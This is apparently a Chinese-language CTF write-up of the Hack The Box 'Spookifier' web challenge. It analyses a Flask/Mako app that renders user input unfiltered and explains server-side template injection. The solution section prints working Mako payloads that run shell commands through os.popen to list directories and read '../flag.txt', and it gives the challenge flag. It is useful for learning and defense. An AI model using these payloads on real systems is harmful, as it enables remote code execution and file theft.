---
title: HTB-Spookifier
date: 2025-04-02 13:16:57
categories: 
  - CTF
  - Web
tags: [Web,HTB,Injection,Template Injection,模板注入,Mako]
excerpt: ""
mathjax: true
---

## **题目描述**

![image-20250327181847887](https://raw.githubusercontent.com/archer-baiyi/Picture/main/image-20250327181847887.png)

（有附件）

## **解题**

### **观察**

打开网站：

![image-20250327181817991](https://raw.githubusercontent.com/archer-baiyi/Picture/main/image-20250327181817991.png)

输入 “abc“ 会看到：

![image-20250327182008238](https://raw.githubusercontent.com/archer-baiyi/Picture/main/image-20250327182008238.png)

然后我们来查看代码（routes.py）：

```python
from flask import Blueprint, request
from flask_mako import render_template
from application.util import spookify

web = Blueprint('web', __name__)

@web.route('/')
def index():
    text = request.args.get('text')
    if(text):
        converted = spookify(text)
        return render_template('index.html',output=converted)
    
    return render_template('index.html',output='')
```

可以看到网页会将我们的输入经过 `sppokify()` 函数转换一下再进行输出。

所以我们接着来查看 `util.py` ：

```python
from mako.template import Template

font1 = {
	'A': '𝕬',
	'B': '𝕭',
	'C': '𝕮',
	...
}

font2 = {
	'A': 'ᗩ', 
	'B': 'ᗷ',
	'C': 'ᑢ',
	...
}

font3 = {
	'A': '₳', 
	'B': '฿',
	'C': '₵',
	...
} 

font4 = {
	'A': 'A', 
	'B': 'B',
	'C': 'C',
	...
}
# 注意，这里的font4收录了所有的字母数字以及符号，并没有做任何修改。

def generate_render(converted_fonts):
	result = '''
		<tr>
			<td>{0}</td>
        </tr>
        
		<tr>
        	<td>{1}</td>
        </tr>
        
		<tr>
        	<td>{2}</td>
        </tr>
        
		<tr>
        	<td>{3}</td>
        </tr>

	'''.format(*converted_fonts)
	
	return Template(result).render()

def change_font(text_list):
	text_list = [*text_list]
	current_font = []
	all_fonts = []
	
	add_font_to_list = lambda text,font_type : (
		[current_font.append(globals()[font_type].get(i, ' ')) for i in text], all_fonts.append(''.join(current_font)), current_font.clear()
		) and None

	add_font_to_list(text_list, 'font1')
	add_font_to_list(text_list, 'font2')
	add_font_to_list(text_list, 'font3')
	add_font_to_list(text_list, 'font4')

	return all_fonts

def spookify(text):
	converted_fonts = change_font(text_list=text)

	return generate_render(converted_fonts=converted_fonts)

```

可以看到定义了4种字体以及输出的页面格式。`change_font()` 和 `spookify()` 则负责转换字体。

假设我们输入了 ”input“，那么服务器按照以下流程来处理我们的输入：

1. 接收我们的输入并赋值给 `text`：

   ```python
   text = request.args.get('text')
   ```

   

2. 调用 `spookify(text)`：

   ```python
   converted = spookify(text)
   ```

   ```python
   def spookify(text):
       converted_fonts = change_font(text_list=text)
       return generate_render(converted_fonts=converted_fonts)
   ```

   

3. 最后再利用 `generate_render()` 创建模板：

   ```python
   def generate_render(converted_fonts):
       result = '''
           <tr><td>{0}</td></tr>
           <tr><td>{1}</td></tr>
           <tr><td>{2}</td></tr>
           <tr><td>{3}</td></tr>
       '''.format(*converted_fonts)
       
       return Template(result).render()
   ```



注意，因为 `font4` 完全不会修改我们输入的内容，所以我们输入的所以内容（包括各种特殊符号）都会保留下来并被渲染进 {3} 的位置。

### **漏洞+渗透**

这道题主要考察的是 **Template Injection（模板注入）**：

**模板注入**是指攻击者将恶意代码注入到模板引擎中，使模板引擎在渲染时执行攻击者控制的表达式，造成信息泄露、RCE（远程代码执行）等后果。





漏洞主要由这几部分一起构成：

1.  没有对输入内容进行过滤；

2. `font4`会保留我们的所有输入内容

3. 使用 `Template(...).render()` 动态渲染字符串模板

4. Mako里刚好有表达式语法：

   ```
   ${}
   ```



所以导致我们输入

```python
${7*7}
```

时，mako会在渲染这部分内容

```python
<tr><td>{0}</td></tr>
<tr><td>{1}</td></tr>
<tr><td>{2}</td></tr>
<tr><td>${7*7}</td></tr>
```

时，执行我们的代码，即 `${7*7}`。所以最后的渲染结果是：

```python
<tr><td>49</td></tr>
```

![image-20250327202650736](https://raw.githubusercontent.com/archer-baiyi/Picture/main/image-20250327202650736.png)

这样子就我们说明注入成功了，接下来就是考虑如何读取flag了。

因为Mako 的底层代码会把 ${ } 表达式里的内容编译成 Python 代码，然后直接执行。所以我们直接注入python代码即可。

首先尝试

```python
${__import__('os').popen('ls').read()}
```

其中

```python
.popen('ls')
```

会执行 `ls` 命令（默认是当前工作目录），而

```python
.read()
```

会把命令输出读取成字符串。

可以看到

![image-20250327203932988](https://raw.githubusercontent.com/archer-baiyi/Picture/main/image-20250327203932988.png)

意味着当前目录下没有flag。我们接着查看上一级目录里的内容：

```python
${__import__('os').popen('ls ..').read()}
```

![image-20250327204017933](https://raw.githubusercontent.com/archer-baiyi/Picture/main/image-20250327204017933.png)

成功找到 `flag.txt` 文件。最后直接读取就好：

```python
${__import__('os').popen('cat ../flag.txt').read()}
```

![image-20250327204055997](https://raw.githubusercontent.com/archer-baiyi/Picture/main/image-20250327204055997.png)

得到flag：`HTB{t3mpl4t3_1nj3ct10n_C4n_3x1st5_4nywh343!!}` 。
